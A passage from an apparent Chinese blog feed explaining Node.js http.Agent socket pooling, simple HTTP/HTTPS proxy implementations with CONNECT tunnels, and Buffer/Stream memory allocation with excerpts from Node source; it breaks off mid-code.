&#125;</span><br></pre></td></tr></table></figure><p>如果该host的socket池里有空闲的，就从<code>freeSockets</code>里取出一个socket,重用并且将这个socket加入到正在处理请求的sockets里，即<code>sockets[name]</code>，如果没有空闲的socket，就准备创建新的socket了，但是首先sockets数不能超过<code>maxSockets</code>，如果超过了，就暂时没有socket用了，就加入到等待队列吧,即这里的<code>this.requests[name]</code>。</p><p>接着我们看看socket是怎么被加入到<code>freeSockets</code>的:</p><p>在<code>createSocket()</code>后，会对新的socket绑定一系列listener,其中包括了<code>onFree</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onFree</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    debug(<span class="string">'CLIENT socket onFree'</span>);</span><br><span class="line">    agent.emit(<span class="string">'free'</span>, s, options);</span><br><span class="line">  &#125;</span><br><span class="line">s.on(<span class="string">'free'</span>, onFree);</span><br></pre></td></tr></table></figure></p><p>socket所处理的request关闭后,就相当于free了，然后agent监听了free事件:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (socket.writable &amp;&amp;self.requests[name] &amp;&amp; self.requests[name].length) &#123;</span><br><span class="line">      self.requests[name].shift().onSocket(socket);</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free以后就去看还有没有处于等待队列的request,如果有就直接取出一个来复用这个socket</p><p>如果没有，就尝试将其加入<code>freeSockets</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (count &gt; self.maxSockets || freeLen &gt;= self.maxFreeSockets) &#123;</span><br><span class="line">    socket.destroy();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// add socket to freeSockets</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当然需要设定agent的<code>keep-alive</code>为true</p><p>当socket被close时，直接从socket池里删除，如果requests队列里还有等待的，就重新create一个socket。</p><h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>proxy方式有许多，这里仅仅以http/https proxy为例，且用node实现。</p><h3 id="盲中继"><a href="#盲中继" class="headerlink" title="盲中继"></a>盲中继</h3><p>对于http网站，流量是可以通过proxy直接转发的，比如这里我实现的:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> httpAgent = <span class="keyword">new</span> http.Agent(&#123;</span><br><span class="line">        keepAlive: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">cReq, cRes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> u = url.parse(cReq.url);</span><br><span class="line">    <span class="keyword">let</span> needAgent = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> headers = <span class="built_in">Object</span>.assign(&#123;&#125;,cReq.headers,&#123;</span><br><span class="line">        <span class="string">'x-forwarded-for'</span>: cReq.connection.remoteAddress</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span>(headers[<span class="string">'proxy-connection'</span>])&#123;</span><br><span class="line">        headers[<span class="string">'connection'</span>] = headers[<span class="string">'proxy-connection'</span>]</span><br><span class="line">        <span class="keyword">delete</span> headers[<span class="string">'proxy-connection'</span>];</span><br><span class="line">        <span class="keyword">if</span>(headers[<span class="string">'connection'</span>] === <span class="string">'keep-alive'</span>)&#123;</span><br><span class="line">            needAgent = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> options = &#123;</span><br><span class="line">        hostname : u.hostname, </span><br><span class="line">        port     : u.port || <span class="number">80</span>,</span><br><span class="line">        path     : u.path,       </span><br><span class="line">        method   : cReq.method,</span><br><span class="line">        headers,</span><br><span class="line">        agent: needAgent?httpAgent:<span class="literal">null</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> pReq = http.request(options, pRes=&gt;&#123;</span><br><span class="line">        cRes.writeHead(pRes.statusCode, pRes.headers);</span><br><span class="line">        pRes.pipe(cRes);</span><br><span class="line">    &#125;).on(<span class="string">'error'</span>, e=&gt;&#123;</span><br><span class="line">        cRes.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cReq.pipe(pReq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里实现的中继并不是最傻的，加入了<code>x-forwarded-for</code>请求头，根据keep-alive设计原则，去除来自agent的请求头中的逐跳首部<code>proxy-connection</code>，如果发现agent想要和源网站建立keep-alive连接，这里就加入<code>http.Agent</code>来管理proxy与源之间的keep-alive连接。至于proxy和user-agent之间的keep-alive问题，正在思考解决中。</p><h3 id="CONNECT隧道"><a href="#CONNECT隧道" class="headerlink" title="CONNECT隧道"></a>CONNECT隧道</h3><p>想想agent与https网站的交流，由于证书机制，在它们中间加一个proxy会怎样，如果用上面那种方式去实现，则会存在一个问题，proxy服务器的证书没有加入agent的信任证书里，那么proxy与agent就建立不了连接。</p><p>我们改用CONNECT方式，通过CONNECT方法建立隧道，来实现转发ssl流量:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">cReq, cSock</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> u = url.parse(<span class="string">'http://'</span> + cReq.url);</span><br><span class="line">    <span class="built_in">console</span>.log(cReq.url)</span><br><span class="line">    <span class="keyword">let</span> pSock = net.connect(u.port, u.hostname, ()=&gt;&#123;</span><br><span class="line">        cSock.write(<span class="string">'HTTP/1.1 200 Connection Established\r\nProxy-agent: Node.js proxy server\r\n\r\n'</span>);</span><br><span class="line">        pSock.pipe(cSock);</span><br><span class="line">    &#125;).on(<span class="string">'error'</span>, e=&gt;&#123;</span><br><span class="line">        cSock.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cSock.pipe(pSock);</span><br><span class="line">&#125;</span><br><span class="line">http.createServer()</span><br><span class="line">    .on(<span class="string">'request'</span>, request)</span><br><span class="line">    .on(<span class="string">'connect'</span>, connect)</span><br><span class="line">    .listen(<span class="number">8888</span>,()=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'the proxy server has been listend at port 8888'</span>)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p><p>抓包看看:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/blog-http-connect.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/blog-http-connect.png"></p><p>可以看到，这种方式下，agent与proxy之间的流量是明文的，这就会导致一个问题，我试着将服务放到国外vps作为梯子，不访问黑名单网站还好，一访问就被GWF发现，proxy就挂了。那么我们可以在agent与proxy之间加层ssl啊。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https.createServer(&#123;</span><br><span class="line">    key: fs.readFileSync(__dirname + <span class="string">'/server/server.key'</span>),</span><br><span class="line">    cert: fs.readFileSync(__dirname + <span class="string">'/server/server.crt'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">    .on(<span class="string">'request'</span>, request)</span><br><span class="line">    .on(<span class="string">'connect'</span>, connect)</span><br><span class="line">    .listen(<span class="number">8888</span>,()=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'the proxy server has been listend at port 8888'</span>)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>最终测试是没问题的:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/node-https-proxy.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/node-https-proxy.png"></p><h2 id="加入了proxy的agent"><a href="#加入了proxy的agent" class="headerlink" title="加入了proxy的agent"></a>加入了proxy的agent</h2><p>通过自定义agent，并实现<code>addRequest()</code>方法，有时候的需求是给Agent加上proxy,这个时候就需要在自定义的agent里进行模拟browser行为与proxy进行交流了。</p><h3 id="http-proxy-agent"><a href="#http-proxy-agent" class="headerlink" title="http-proxy-agent"></a>http-proxy-agent</h3><p>这种agent只适用于源网站为http的，这种网站可以直接走盲中继</p><p>它的实现方式很简单，直接使用<code>net</code>或<code>tls</code>建立socket,然后与proxy进行交流:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.secureProxy) &#123;</span><br><span class="line">    socket = tls.connect(proxy);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    socket = net.connect(proxy);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这个模块它是直接放弃<code>keep-alive</code>行为的，即没有发送<code>&#39;proxy-connection&#39;:&#39;keep-alive&#39;</code>,粗暴处理</p><h3 id="https-proxy-agent"><a href="#https-proxy-agent" class="headerlink" title="https-proxy-agent"></a>https-proxy-agent</h3><p>该模块为了转发ssl流量，做法就是上面<code>proxy</code>小节提到的CONNECT方式：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hostname = opts.host + <span class="string">':'</span> + opts.port;</span><br><span class="line">  <span class="keyword">var</span> msg = <span class="string">'CONNECT '</span> + hostname + <span class="string">' HTTP/1.1\r\n'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> headers = <span class="built_in">Object</span>.assign(&#123;&#125;, proxy.headers);</span><br><span class="line">  <span class="keyword">if</span> (proxy.auth) &#123;</span><br><span class="line">    headers[<span class="string">'Proxy-Authorization'</span>] =</span><br><span class="line">      <span class="string">'Basic '</span> + <span class="keyword">new</span> Buffer(proxy.auth).toString(<span class="string">'base64'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> host = opts.host;</span><br><span class="line">  <span class="keyword">if</span> (!isDefaultPort(opts.port, opts.secureEndpoint)) &#123;</span><br><span class="line">    host += <span class="string">':'</span> + opts.port;</span><br><span class="line">  &#125;</span><br><span class="line">  headers[<span class="string">'Host'</span>] = host;</span><br><span class="line"></span><br><span class="line">  headers[<span class="string">'Connection'</span>] = <span class="string">'close'</span>;</span><br><span class="line">  <span class="built_in">Object</span>.keys(headers).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    msg += name + <span class="string">': '</span> + headers[name] + <span class="string">'\r\n'</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  socket.write(msg + <span class="string">'\r\n'</span>);</span><br></pre></td></tr></table></figure></p><p>相当于就是模拟了browser的行为，向proxy发送CONNECT请求来建立隧道。</p><h3 id="其他proxy"><a href="#其他proxy" class="headerlink" title="其他proxy"></a>其他proxy</h3><p>如socks之类的，篇幅有限，这里就不解释了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;聊聊Agent/Proxy，以Node为例，看看&lt;code&gt;ClientRequest&lt;/code&gt;是如何通过&lt;code&gt;http.Agent&lt;/code&gt;去管理socket池，用Node写http/https proxy,再自定义Agent并在Agent与目标源之间加入Node proxy。&lt;/p&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="Proxy" scheme="http://luoxia.me/code/tags/Proxy/"/>
    
      <category term="Agent" scheme="http://luoxia.me/code/tags/Agent/"/>
    
  </entry>
  
  <entry>
    <title>Buffer/Stream与内存管理</title>
    <link href="http://luoxia.me/code/2017/06/29/Buffer-Stream%E4%B8%8E%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://luoxia.me/code/2017/06/29/Buffer-Stream与内存管理/</id>
    <published>2017-06-29T13:40:28.000Z</published>
    <updated>2017-11-16T13:10:06.483Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章将开启我的Node源码解读系列，结合源码和官方文档，探索其背后的原理。首先想谈谈Stream这强大而又容易误解的功能，文章主要从Buffer/Stream与内存分配的关系角度来分析。</p><a id="more"></a><h1 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h1><h2 id="单次分配大小限制"><a href="#单次分配大小限制" class="headerlink" title="单次分配大小限制"></a>单次分配大小限制</h2><p>一次性分配Buffer的大小限制(src/node_buffer.h)：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> kMaxLength =</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="keyword">int32_t</span>) == <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>) ? <span class="number">0x3fffffff</span> : <span class="number">0x7fffffff</span>;</span><br></pre></td></tr></table></figure></p><p><code>Buffer.from(), Buffer.alloc(),　Buffer.allocUnsafe()</code>这些用于构造Buffer对象的方法分配内存前都会检查size参数:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assertSize</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; binding.kMaxLength) &#123;</span><br><span class="line">    err = <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">'"size" argument must not be larger '</span> +</span><br><span class="line">                         <span class="string">'than '</span> + binding.kMaxLength);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><h2 id="C-直接分配策略"><a href="#C-直接分配策略" class="headerlink" title="C++直接分配策略"></a>C++直接分配策略</h2><p>由C++直接分配内存，实际上是由ArrayBuffer分配内存，在此基础上建立Uint8Array的View,Buffer继承该View。</p><p><strong>Buffer.alloc()</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Buffer.alloc = <span class="function"><span class="keyword">function</span>(<span class="params">size, fill, encoding</span>) </span>&#123;</span><br><span class="line">  assertSize(size);</span><br><span class="line">  <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; fill !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> encoding !== <span class="string">'string'</span>)</span><br><span class="line">      encoding = <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">return</span> createUnsafeBuffer(size).fill(fill, encoding);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> FastBuffer(size);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createUnsafeBuffer</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> FastBuffer(createUnsafeArrayBuffer(size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createUnsafeArrayBuffer</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  zeroFill[<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//设定C++默认填充策略为不填充</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(size);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    zeroFill[<span class="number">0</span>] = <span class="number">1</span>;　<span class="comment">//分配完后，恢复填充策略</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastBuffer</span> <span class="keyword">extends</span> <span class="title">Uint8Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(arg1, arg2, arg3) &#123;</span><br><span class="line">    <span class="keyword">super</span>(arg1, arg2, arg3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Buffer.allocUnSafeSlow（）</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Buffer.allocUnsafeSlow = <span class="function"><span class="keyword">function</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  assertSize(size);</span><br><span class="line">  <span class="keyword">return</span> createUnsafeBuffer(size);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>Buffer.from(ArrayBuffer)</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> FastBuffer(obj, byteOffset, length);</span><br></pre></td></tr></table></figure></p><p>可见alloc()没指定填充和from(ArrayBuffer)都不经过createUnsafeBuffer()，就不会有默认填充策略的改变，就直接使用ES　ArrayBuffer的默认行为（即默认字节值为0),保证安全性。</p><h3 id="slab与C-直接分配结合"><a href="#slab与C-直接分配结合" class="headerlink" title="slab与C++直接分配结合"></a>slab与C++直接分配结合</h3><p><strong>Buffer.from(String)</strong>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (length &gt;= (Buffer.poolSize &gt;&gt;&gt; <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">return</span> binding.createFromString(string, encoding);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (length &gt; (poolSize - poolOffset))</span><br><span class="line">  createPool();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> FastBuffer(allocPool, poolOffset, length);</span><br><span class="line"><span class="keyword">const</span> actual = b.write(string, encoding);</span><br><span class="line"><span class="keyword">if</span> (actual !== length) &#123;</span><br><span class="line">  <span class="comment">// byteLength() may overestimate. That's a rare case, though.</span></span><br><span class="line">  b = <span class="keyword">new</span> FastBuffer(allocPool, poolOffset, actual);</span><br><span class="line">&#125;</span><br><span class="line">poolOffset += actual;</span><br><span class="line">alignPool();</span><br><span class="line"><span class="keyword">return</span> b;</span><br></pre></td></tr></table></figure></p><p>  当字符串长度大于等于poolSize/2时，C++直接分配内存;反之则采用slab分配策略，即从pool里通过slice方式共享pool的一部分内存，剩余的再给其他Buffer用。</p><p>  这里的poolSize默认值有设置:<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Buffer.poolSize = <span class="number">8</span> * <span class="number">1024</span>;</span><br></pre></td></tr></table></figure></p><p>当然这只是在Buffer类里而已，后面分析的Stream类就会有不同的poolSize,而不同stream实现又会有差别。</p><p><strong>Buffer.from(Array/Buffer/TypedArray)</strong>和<strong>Buffer.allocUnsafe()</strong>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FastBuffer();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; (Buffer.poolSize &gt;&gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; (poolSize - poolOffset))</span><br><span class="line">      createPool();</span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> FastBuffer(allocPool, poolOffset, size);</span><br><span class="line">    poolOffset += size;</span><br><span class="line">    alignPool();</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> createUnsafeBuffer(size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>来一张图:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/memory.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/memory.png"></p><h1 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h1><h2 id="highWaterMark"><a href="#highWaterMark" class="headerlink" title="highWaterMark"></a>highWaterMark</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hwm = options.highWaterMark;</span><br><span class="line"><span class="keyword">var</span> defaultHwm = <span class="keyword">this</span>.objectMode ? <span class="number">16</span> : <span class="number">16</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">this</span>.highWaterMark = (hwm || hwm === <span class="number">0</span>) ? hwm : defaultHwm;</span><br><span class="line"><span class="keyword">this</span>.highWaterMark = <span class="built_in">Math</span>.floor(<span class="keyword">this</span>.highWaterMark);</span><br></pre></td></tr></table></figure><p>默认为16个对象(objectMode下)和16KB，而针对于不同的stream实现，又会对其进行重写，如fs模块的readStream:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.highWaterMark === <span class="literal">undefined</span>)</span><br><span class="line">    options.highWaterMark = <span class="number">64</span> * <span class="number">1024</span>;</span><br></pre></td></tr></table></figure></p><p>默认为64KB</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>整个过程进行了两层抽象，一层是stream层的，具有一个BufferList，源码参照<code>/lib/internal/streams/BufferList.js</code><br>这一层用于存储将要消费的Buffer队列；而另一层是内部Buffer,通过slab分配内存的方式，从源文件里读出特定大小的数据，然后通过slice()方法，将这部分内存push到BufferList里。</p><h3 id="实现-read-方法"><a href="#实现-read-方法" class="headerlink" title="实现_read()方法"></a>实现_read()方法</h3><p>._read()方法里去调用源资源的read()操作，读出来的数据暂时存在内部buffer里</p><p>fs模块的ReadStream实现的_.read()方法里:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ReadStream.prototype._read = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.fd !== <span class="string">'number'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.once(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>._read(n);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.destroyed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!pool || pool.length - pool.used &lt; kMinPoolSpace) &#123;</span><br><span class="line">    <span class="comment">// discard the old pool.</span></span><br><span class="line">    allocNewPool(<span class="keyword">this</span>._readableState.highWaterMark);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> thisPool = pool;</span><br><span class="line">  <span class="keyword">var</span> toRead = <span class="built_in">Math</span>.min(pool.length - pool.used, n);</span><br><span class="line">  <span class="keyword">var</span> start = pool.used;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.pos !== <span class="literal">undefined</span>)</span><br><span class="line">    toRead = <span class="built_in">Math</span>.min(<span class="keyword">this</span>.end - <span class="keyword">this</span>.pos + <span class="number">1</span>, toRead);</span><br><span class="line">  <span class="keyword">if</span> (toRead &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.push(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  fs.read(<span class="keyword">this</span>.fd, pool, pool.used, toRead, <span class="keyword">this</span>.pos, onread);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.pos !== <span class="literal">undefined</span>)</span><br><span class="line">    <span class="keyword">this</span>.pos += toRead;</span><br><span class="line">  pool.used += toRead;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">onread</span>(<span class="params">er, bytesRead</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (er) &#123;</span><br><span class="line">      <span class="keyword">if</span> (self.autoClose) &#123;</span><br><span class="line">        self.destroy();</span><br><span class="line">      &#125;</span><br><span class="line">      self.emit(<span class="string">'error'</span>, er);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> b = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> 